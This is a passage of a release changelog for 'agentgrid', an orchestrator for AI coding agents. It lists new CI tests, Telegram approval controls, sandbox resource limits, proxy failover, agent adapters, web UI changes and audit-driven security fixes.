  smoke (Plans 0.3/6.13/6.14).** `docker-images` builds all three
  published images per PR (glibc CP, musl/scratch CP, node-daemon) and
  smoke-boots the CP image (health + /v1/version); nightly
  `tier1-musl-smoke` runs the musl release binaries inside Debian 12,
  Debian 13 and Ubuntu 24.04 containers (`--version` + CP
  `/health/ready`); nightly `arm64-musl-smoke` boots the aarch64
  binaries under QEMU. Publish stays in release.yml.
- **Pre-commit hook (`.githooks/pre-commit`, Plan 0.2).** Opt-in via
  `git config core.hooksPath .githooks`: runs `cargo fmt --all --check`
  + `cargo clippy --all-targets -- -D warnings` when staged `.rs`
  files exist — the same gates CI enforces, before the push.
- **Monitoring docs + Grafana dashboard (Plan 3.10).**
  `docs/monitoring.md`: Prometheus scrape config, the full metric
  reference table (real metric names/labels from `/metrics`), alerting
  rules (queue starvation, outbox backlog, stale backups, SQLite
  contention) and a ready-to-import dashboard at
  `deploy/grafana-dashboard.json`.
- **Compatibility matrix (`docs/compatibility-matrix.md`, Plans
  6.13/6.14).** What CI actually covers per OS (Ubuntu 24.04 per-PR;
  Debian 12/13 nightly musl smoke; ARM64 QEMU nightly), what works by
  construction (xfs, Fedora/Rocky/Arch via musl), and honest Tier-3
  guidance (WSL2 in-distro with the ext4 rule, Alpine via the musl
  images, NixOS/no-systemd caveats).
- **TROUBLESHOOTING.md: enrollment / clone / adapter / TLS sections
  (Plan 3.8).** One-time token semantics + credential reuse, probed
  (not declared) adapter capabilities and the queued-not-failed
  scheduler behaviour for incompatible tasks, bare-mirror/lock
  recovery, rustls CA trust and reverse-proxy considerations.

- **Keyset pagination for `/v1/audit`.** `list_audit` gains a
  `(before_created_at, before_id)` cursor paging back through the
  newest-first trail; the route emits `next_cursor` while full pages remain
  and ignores half-cursors. The UI's Audit view pages via "Load more"
  instead of silently truncating at the server's 500-row cap. Covered by a
  new api test (no repeats/drops across pages, cursor lifecycle, `%2B`
  percent-encoding of rfc3339 timestamps).
- **`agentgrid_task_errors_total` metric.** Failed/cancelled task counts
  by `error_code` (full-table GROUP BY, empty label = unclassified) —
  keeps the Stage-12 `resource_limit:memory` vs `agent_failed` split
  alertable in Prometheus.
- **Telegram gateway maturation.** New `/approvals` command (pending
  permission queue, newest first) plus `/allow <id>` / `/deny <id>`
  answering through the CP's approval endpoints — the "human gates" are
  now operable from the phone, not just the web UI.
- **Native Telegram notifications.** `AGENTGRID_NOTIFY_WEBHOOK` pointing
  at `https://api.telegram.org/bot<token>/sendMessage?chat_id=<n>` now
  sends the Bot API shape (`{chat_id, text}` with a human-readable
  status line) instead of the generic JSON document. Every other URL
  (ntfy.sh, custom) keeps the old generic POST.
- **Inline approval buttons in the Telegram gateway.** `/approvals` now
  attaches an inline keyboard — one `✅ Allow / ❌ Deny` row per pending
  entry — and the gateway handles `callback_query` taps (`ag:allow:<id>`
  / `ag:deny:<id>`): answers the approval, acks the tap via
  `answerCallbackQuery` and posts the outcome back to the chat. The
  plain `/allow` / `/deny` commands remain as a fallback.
- **`AGENTGRID_TELEGRAM_API` env override** for the gateway's Bot API
  base (default `https://api.telegram.org`) — points the gateway at a
  self-hosted Bot API server, and powers the new process-based E2E
  (`tests/e2e/run-telegram-gateway.sh` + `mini-telegram-bot.py`, wired
  into the CI e2e-failinject job): asserts the approvals listing carries
  the permission and the keyboard, and a deny tap resolves the approval
  CP-side.
- **Web UI overhaul.** Grouped sidebar navigation with a mobile burger menu
  (replacing the overflowing 20-button topbar), `aria-current` markers and a
  pending-approvals badge refreshed over the change stream; global toasts for
  action feedback (approve/deny/revoke/drain); light theme with a persisted
  toggle; relative timestamps (`2m ago`) in dashboard/approvals/nodes/audit;
  a tasks-finished-per-hour sparkline card; hotkeys (`n` → new task, `/` →
  focus search); dynamic `document.title`; an inline SVG favicon; table
  skeletons with a reduced-motion-aware shimmer; server-side "Load more" in
  Audit; a render cap + IntersectionObserver scroll-up sentinel in the task
  log view (no more jank on thousands of lines); a "Page not found" notice
  for unknown hashes. Frontend test suite grows to 20 vitest cases
  (`fmtAgo`/`fmtTime`).
- **Per-attempt resource limits on the Docker sandbox (Stage 12 / ADR
  0003).** The profile's `ResourceLimits { memory_max, cpu_quota_percent,
  tasks_max }` now reach the container: `sandbox_prefix`/`sandbox_command`
  accept a `limits` argument and `docker_run_head` maps it to
  `--memory/--cpus/--pids-limit` (CPUQuota 150% → `--cpus 1.50`). Set fields
  override the node-wide env knobs per attempt; unset fields keep the env
  fallback. Both spawn paths ride it — the wrapper path via
  `SpawnRequest.limits`, the ACP path via the fetched CP profile (which
  previously had no limits at all).
- **OOM-killed attempts now report `resource_limit`, not `agent_failed`** —
  the exit-137 of an OOM kill is indistinguishable from a crash at the exit
  code level. After a sandboxed attempt exits, the node asks the runtime
  (`docker inspect -f {{.State.OOMKilled}}`) and upgrades the outcome to the
  first-class `resource_limit:memory` error code, so a hit ceiling is
  distinguishable from an agent crash (e.g. never auto-retry an OOM). To keep
  the container inspectable, named per-attempt containers are no longer
  `--rm` (the OOM inspect raced auto-removal); transient probes (validation/
  eval) keep `--rm`, and cancel/timeout plus the startup sweep still reap.
- **Mock adapter `oom:<mb>` command** — allocates and touches `<mb>` MiB so
  the memory limit trips deterministically (E2E fixture, no LLM).
- **E2E `tests/e2e/run-oom-limit.sh`** — process-based CP+node with a
  Docker-sandboxed attempt (`--memory 64m`): mock `oom:512` → runtime OOM
  kill → attempt `failed` with `error_code=resource_limit:memory`. Wired
  into the CI `e2e` job (`AGENTGRID_SANDBOX_IMAGE=ag-node:test`); skips
  cleanly when docker is unavailable.

### Fixed

- **The crate now compiles on Windows (local dev).** `statvfs`
  (artifact-root free-space probe) and the `flock` instance-lock are
  linux-only; both are now `#[cfg]`-gated with a conservative fallback
  (assume "disk not full" / skip the lock). Production deploys are
  unaffected.
- **Dead CSS variables in the web panel** — `--text`/`--bg2` never existed
  (now `--fg`/`--panel2`); duplicated `.cards`/`.card` and `.badge` blocks
  merged into one source of truth (the workflow-viewer overrides silently
  re-styled every badge on the page).

## [0.4.5] - 2026-09-08

### Changed

- **rand 0.8 → 0.10 and sha2 0.10 → 0.11 (workspace crates).** rand 0.10
  moved `random`/`random_range` onto `RngExt` and thread_rng → `rng()`;
  digest 0.11 dropped `LowerHex` on the output array, so the shared
  `sha256_hex` hex-encodes explicitly — output pinned by a FIPS 180-4
  vector test (audit X-D1: the hash round-trips CP↔node). Cargo.lock
  regenerated on the CI runner (`lock-regen` workflow, one-shot).
- **jsonwebtoken stays on 9.x.** An 11.x bump (rust_crypto backend) was
  attempted and reverted: the backend feature set re-introduces `rsa`
  (RUSTSEC-2023-0071, no patch — we only use HS256, but the supply-chain
  gate fails on any unpatched critical), and cargo-deny 0.20.2 cannot
  resolve the workspace graph with the new feature pin
  (`unresolved-workspace-dependency` on every path dep). Revisit when
  cargo-deny fixes workspace-dep resolution or jwt ships an HS256-only
  backend feature.

### Fixed

- **Bulk scheduler prefetch covered the wrong tasks when earlier queue
  rows were ineligible (audit X-S1).** The prefetch keyed the first `cap`
  queue rows while the loop scanned past skipped ones — any task past the
  prefix shipped with missing role/count/eval/repo data (non-read-only
  verifier, retry number 1, empty eval suite, blank repo). The loop now
  pre-filters eligible candidates (pure row data, no DB) and the prefetch
  covers exactly them; the shared empty guard also closes the `IN ()`
  syntax error on an empty queue or all-ineligible prefix.
- **Zero-step workflow runs 500'd their projection (audit X-C3)** —
  `step_run_id IN ()` is a SQLite syntax error. Returns the empty map like
  the old per-step loop.
- **Diff secrets were matched only at line start (audit X-C4)** — real
  diffs embed keys after `=`/`"`/space and never fired. Matching is
  substring now (the length gate still filters short accidental hits).
- **Agent-controlled patch bytes could panic the scanner on truncation
  (audit X-C5)** — both `truncate` helpers now cut on char boundaries.
- **Adapter-env listing ordered globals arbitrarily (audit X-C6)** — the
  `ORDER BY (node_id IS NULL)` predicate never matched (`''`, not NULL).
  Matches the `(node_id = '')` predicate the effective-entries query uses.
- **Completion redelivery re-ran diff/scope scans and re-pushed the
  operator (audit X-C7).** A new idempotent guard (marker scan rows in the
  event stream) runs scans and the terminal notify once per attempt.
- **Legacy CP polls wiped the node's proxy pool and managed env every
  cycle (audit X-N1b).** Both fields document Empty=keep current, but the
  node replaced them with the delivered (empty) lists; delivery now skips
  empties.
- **Fail-open restricted egress without a proxy URL (audit X-N2/X-N3).**
  Attaching to the egress bridge with no filtering URL is unfiltered
  internet — restricted now requires network AND URL, else collapses to
  `none`; `resolved_network_mode` mirrors it and the isolation gauge
  reports the truthful value.
- **Sandboxed agents received no credentials, proxy or managed env at all
  (audit X-N3b).** `SpawnRequest.env` only reached the `docker` client
  process; the attempt env now also lands in the container via `--env`
  (ACP path included via `sandbox_command`), while probes keep `&[]`.
- **The GitHub push token rode in argv (audit X-N6)** — world-readable in
  `/proc/<pid>/cmdline`. It travels through a 0600 askpass helper now;
  repo/branch are validated up front (`owner/name`, no option-injection),
  and same-repo PR heads fall back to the bare branch.
- **Validation-feedback retries dropped the project brain (audit X-N8)** —
  rebuilt from the base prompt only. The brain block carries forward.
- **The brain block now states its provenance (audit X-N12)** — same trust
  tier as AGENTS.md, repo-provided convention.
- **Aider safe mode no longer matches its docs (audit X-N7)** — the
  documented `--no-git --chat-mode=chat` restores `--no-git`.

## [0.4.4] - 2026-09-03

### Added
- **Host-memory scheduling gate**: nodes report `MemAvailable` in every
  heartbeat; the CP skips assignment when it is known and below
  `AGENTGRID_MIN_FREE_MEM_MB` (default 1024 MiB). 0 = not reported
  (legacy nodes) — admitted. Migration `0082_mem_available.sql`.

- **CP-managed adapter env** (`ag adapter-env ls/set/rm`, `/v1/adapter-env`):
  key/value pairs (adapter-scoped or `*`, global or per-node) pushed to
  nodes in poll responses and injected into attempt process env. Enables
  pointing adapters at non-default endpoints from the control plane —
  e.g. Claude Code via a third-party gateway:
  `ag adapter-env set claude ANTHROPIC_BASE_URL https://agentrouter.org`,
  `… set claude ANTHROPIC_AUTH_TOKEN sk-…`. Local `AGENTGRID_ADAPTER_ENV`
  wins on key collision. Migration `0081_adapter_env.sql`.
- **Heartbeat proxy failover**: heartbeats rotate through the proxy pool
  on connect/timeout, same as the poll loop.
- **Beta lift**: schedules / plan expansion / `zeroshot` cluster adapter /
  shared task-group context now publish a beta contract (ADR 0014).
- **Adapter: pi** — `adapter-pi` wraps `pi --mode json -p` and translates
  documented JsonAgentSessionEvent events into the contract. Verified against
  a live pi session on this box.
- **Adapter: aider** — `adapter-aider` runs `aider -m` in unattended mode;
  plain-text sessions surface as `log`/`progress` events (token summary);
  `--yes-always` gated on `AGENTGRID_UNSAFE_UNATTENDED` (without it, aider
  runs read-only `--chat-mode chat`). Binary resolution falls back to
  `python3 -m aider` when the bare binary is not on PATH.
- **Adapter: codex** — new `adapter-codex` binary wraps `codex exec --json`,
  translating `item.completed` / `turn.completed` events into the agentgrid
  contract. Safety ladder mirrors the claude adapter: default `--sandbox
  workspace-write`, `AGENTGRID_UNSAFE_UNATTENDED=1` switches to
  `--dangerously-bypass-approvals-and-sandbox`. `AGENTGRID_CODEX_BIN`,
  `CODEX_MODEL` and CP-managed adapter env cover binary/model/key
  configuration; the provably-not-on agentrouter quirk (no `/v1/responses`)
  is documented in `docs/adapters.md`.
- **Workflows + skills/MCP → beta**: ADR 0013 freezes the DAG/schedule/run
  contract and the skill registry DTOs; README maturity table updated.
- **Host-disk scheduling gate**: scheduler also rejects assignment when the
  node reports less than `AGENTGRID_MIN_FREE_DISK_MB` (default 2048 MiB) free
  on its workspace root; 0 = unknown -> admit. Nodes expose
  `mem_available_mb` alongside `free_disk_mb` in `/v1/nodes`, the web nodes
  table and `ag nodes show`; `node eligibility` now narrates low-mem /
  low-disk as visible skip reasons instead of a silently idle queue.
- **Proxy health prober** (`AGENTGRID_PROXY_PROBE_SECS=60`, `0` disables):
  node TCP-probes pool entries; revived proxies get traffic again early,
  dead ones stay quarantined without waiting out the full TTL. E2E covers
  kill → failover → revive → return.

## [0.4.3] — 2026-09-02

### Added

- **CP-managed egress proxy pool with failover.** `ag proxy ls/add/rm`
  (`/v1/proxies`) registers proxy URLs (global pool or `--node`-scoped);
  nodes receive their effective list in every poll response and route all
  egress through it — CP traffic (poll/WS fallback), GitHub API write-back
  (PR/issue comments), and attempt env (`HTTP(S)_PROXY`/`ALL_PROXY`
  injected into adapter + sandboxed-container processes). On a
  connect/timeout failure the node marks the proxy dead (5-minute
  quarantine) and rotates to the next URL; with the whole pool dead it
  falls back to direct egress. Node-level override:
  `AGENTGRID_PROXY_URLS=url1,url2` ignores the CP list. WS connect itself
  is not proxied (tokio-tungstenite has no CONNECT support) — poll
  fallback covers proxied environments.
- **Web UI proxy page** (`#/proxies`): list/add/remove pool entries.
- **E2E proxy failover test** (`tests/e2e/run-proxy-failover.sh`): node
  rotates proxies when the active one dies mid-run.
- **Sandbox cold-start benchmark** (`tests/e2e/measure-sandbox-coldstart.sh`).

### Docs

- ADR 0012 (egress proxy pool); `docs/ROADMAP.md` — tracked status summary
  of the exhausted competitor roadmap; agent-ops proxy ops section.

### Maintenance

- control-plane `store.rs` split: 3 750 lines of inline tests moved to
  `store/tests.rs` (968-line module left).
- CLI `main.rs` 3 808 → 1 985 lines: `nodes.rs` + `registry.rs` extracted.
- node-daemon `git.rs` test suite extracted to `git/tests.rs`.

## [v0.4.2] — 2026-08-31

### Added

- **Web UI test suite**: vitest + 7 tests over the unified-diff parser
  (`parsePatchLines`, multi-file hunks / renames / no-newline markers),
  wired into the CI web job.
- **RSS budget E2E gate** (`tests/e2e/run-rss-budget.sh`): asserts the
  AGENTS.md budgets (node idle ≤25 MiB, node streaming ≤60 MiB, CP
  ≤64 MiB) against live processes; replaces the manual rm-rss-test.sh.
- **Store race test**: 8 concurrent nodes racing one pending task must
  yield exactly one assignment (double-assign regression guard).
- **Flush throughput probe** (`tests/e2e/measure-flush.sh`): one-off
  chatty-adapter benchmark; debug build measured ~363 events/s
  end-to-end (20 000 events).
- **scripts/cleanup.sh**: codifies the dev-box disk hygiene (target
  intermediates, aged /var/tmp leftovers, optional --full/--docker/--npm).

### Changed

- **Node poll loop backs off exponentially** on failures (3s → 24s cap,
  resets on success) instead of hammering a down control plane every
  2–3 seconds.
- **Event outbox group-fsync** (`AGENTGRID_OUTBOX_FSYNC_MS`, default
  100 ms; 0 restores fsync-per-event): chatty-adapter throughput
  363 → ~870 events/s (20 000-event mock task). Machine-crash loss
  window is now ≤ the interval; process-crash durability is unchanged
  and acked events always re-anchor an fsync.

### Fixed

- **Drain E2E was silently broken**: it POSTed the drain flag as a JSON
  body while the API reads `?drain=` query params — the "undrain" step
  actually drained. The script now passes the query param, and undrain
  additionally `notify_waiters()` so parked schedulers wake immediately.

### Docs

- ADR 0001 node-channel row marked superseded by ADR 0009 (WebSocket is
  the primary channel with long-poll fallback).
- README gains a **single-binary quickstart** (download release tarball →
  run → setup in the embedded UI) and the maturity table now reflects the
  UI being embedded in the binary.

### Maintenance

- Dead RUSTSEC-2023-0071 suppression removed from deny.toml and
  supply-chain.yml (sqlx 0.9 no longer pulls `rsa` transitively).

## [v0.4.1] — 2026-08-30

### Added

- **Release workflow: boot-the-binary sanity gate in publish** — the
  packaged x86_64-musl tarball is started on the runner and must answer
  `/health/ready` and serve the embedded UI before signing/publishing.
- **Approvals UI: bulk-approve all pending** with a confirmation modal.
- **New Task: live request preview** (the exact JSON POSTed, incl. via
  consensus fan-out and GitHub write-back).

### Fixed

- **Musl scratch image no longer boots to a missing data dir.** Dropping
  the `web/dist` copy (now embedded) also removed the only step that
  created `/var/lib/agentgrid`; the container crashed opening the SQLite
  db. The dir is materialized from the builder stage.
- **Release tarballs carry the exec bit again.** download-artifact v4
  strips modes — the v0.4.0 assets shipped 644 binaries. (On v0.4.0 run
  `chmod +x` after untarring.)

### Maintenance

- `docs/plans/0.3-websocket-and-scale.md` removed (shipped by v0.4.0).
- `.dockerignore` added (target/, node_modules, .git, dbs, plan docs) —
  smaller build contexts.
- Release workflow: cosign sign-blob now retries up to 3× on transient
  Sigstore timestamp-service failures.
- Release workflow: `chmod +x` before packaging — download-artifact v4
  strips the exec bit, so the v0.4.0 tarballs shipped non-executable
  binaries (fixed above).

## [v0.4.0] — 2026-08-29

### Added

- **Web UI embedded into the control-plane binary (rust-embed).**
  `agentgrid-control-plane` now serves the full React UI with no side
  files: release binaries, containers and bare checkouts all show the UI
  out of the box. Priority is unchanged — `AGENTGRID_WEB_ROOT` overrides,
  then an exe-relative `web/dist`, then the embedded assets. SPA fallback,
  security headers (`CSP`/`nosniff`/`DENY`), `no-cache` for index.html and
  immutable caching for hashed assets are shared between the filesystem
  and embedded paths; a build.rs placeholder keeps bare `cargo build`/
  `cargo test` working without the npm step.
- **Web UI parity push — the operator surface no longer CLI-only.** New
  panels: Users (list + create), Agents (register + action trail), Agent
  Profiles (revisions + activate), Learnings (add/approve/revoke/delete per
  repo), Conversations (list + multi-turn chat), Shared Context (per-group
  key/value notes), MCP servers (registry + delete), Repositories (add),
  Admin (SQLite backup + storage GC dry-run/run + autonomy policy dry-run),
  Workflow authoring (template create from steps + fire run + interval
  schedules).
- **Nodes panel:** one-shot enrollment-token minting (copyable) and
  per-node credential-pool usage (env / token idx / attempts / rate-limits).
- **Opencode profiles:** A/B rollout via `assign-percent` directly on the
  profile card.
- **New Task form: full `CreateTaskRequest` surface** — advanced section
  with base_commit, network_mode, security_profile, max_attempts,
  ACP session resume, task group, agent attribution, opencode model
  overrides, GitHub write-back (repo/issue/base-ref) and multi-adapter
  consensus runs (N tasks, one group id — same semantics as
  `ag run --consensus N --models …`).
- **Task details: editable tags** (add/remove chips inline).
- **API: `GET /v1/conversations`** — list conversations newest-first (the
  route previously only supported create/show-per-id; store gains
  `list_conversations`).

### Removed

- **Meta-plan docs trimmed from the repo.** Completed or superseded planning
  files removed to cut documentation noise for new readers (git history
  retains them): `agentgrid-hardening-plan.md` (641/642 items done; the one
  deferred item moved to issue #52), `docs/plans/0.2-completion.md` (plan
  fully delivered), `docs/plans/0.4-production-ready.md` (was already
  deprecated — k8s/Postgres path rejected against the SQLite-only
  constraints), `docs/plans/windows-deploy-*.md` (Windows is not a supported
  target; unreferenced). The gitignored competitor roadmaps stay.

### Security

- **RUSTSEC-2025-0134 closed: rustls-pemfile dropped from the workspace.**
  The TLS loader now uses `rustls-pki-types`' `PemObject` (pki-types ≥ 1.11,
  already in the rustls 0.23 graph) for cert/key PEM parsing; the archived
  crate is gone from the dependency tree and the advisory ignore removed
  from `deny.toml`. For a rustls-only project this was the most
  supply-chain-sensitive RUSTSEC warning on the board.

### Fixed

- **GitHub Release body was empty for tagged releases.** The release
  workflow extracted the `## [vX.Y.Z]` section with an exact `$0 ==` awk
  comparison, but real headers carry a suffix ("## [v0.3.9] — 2026-08-29"),
  so every tagged release published an empty body ("No changelog entries").
  Now a prefix match, verified against the v0.3.9 section.

### Added

- **Image smoke test in CI (`tests/e2e/run-image-smoke.sh`).** Boots the
  built images and verifies liveness end to end: the musl control-plane
  (`FROM scratch`, no shell — deliberately no HEALTHCHECK) must serve
  `/health/ready` and a setup+login+task-list round trip on a real volume;
  the glibc control-plane and node-daemon must reach docker `Health=
  healthy` via their HEALTHCHECKs. Catches the v0.3.7 bug class (a
  HEALTHCHECK that could never succeed in its own image) at CI time.
- **Scope-creep guard integration test (false-positive cases).** Drives
  the scan through `TaskLifecycleService::complete_attempt` like the HTTP
  layer: one `scope_creep` audit event for an unrequested `md5sum` tool
  call; silence when the prompt mentions hashing; silence for hash-free
  attempts.
- **Property-style test for the agent-budget write-gate race.** Deterministic
  (workers × max_tasks) grid asserting concurrent attributed creations let
  exactly `min(workers, max_tasks)` through and spend exactly that many —
  the check-then-act race class from the v0.3.6 audit.

### Maintenance

- **Transitive RUSTSEC advisories patched via Cargo.lock:** event-listener
  5.4.1 → 5.4.2 (unsound `StackSlot` `!Send` crossing, RUSTSEC-2026-0221;
  via sqlx-core) and lru 0.18.1 → 0.18.3 (use-after-free in
  `LruCache::pop()` panic path, RUSTSEC-2026-0253; via ratatui/TUI). Both
  fix-release-only bumps, no code change. Issues #38/#39 closed.
- **Repo description + topics set** (`rust`, `ai-agents`, `orchestrator`,
  `llm`, `coding-agents`); previously empty.
- **README: "Why this instead of k8s Jobs + cron" section on the first
  screen** — the trust/review/zero-deps/human-gate story before any install
  steps; status line un-staled (0.3.2 → 0.3.9).

> Older release notes (v0.3.x and earlier) live in CHANGELOG-archive.md.
